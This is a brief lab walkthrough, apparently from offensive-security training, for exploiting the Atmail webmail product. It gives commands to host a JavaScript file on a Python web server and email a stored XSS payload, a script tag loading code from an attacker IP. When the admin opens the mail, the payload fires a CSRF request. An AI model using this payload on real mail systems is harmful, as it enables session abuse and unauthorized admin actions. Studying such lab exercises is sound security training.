1. Send malicious mail
	* `python -m SimpleHTTPServer 9090`
	* `python atmail_sendemail.py atmail '<script src="http://192.168.119.134:9090/atmail_sendmail_XHR.js"></script>'`
1. Login to atmail with **admin@offsec.local** and you should received the malicious email. Following screenshots show that the malicious email triggered the CSRF request.
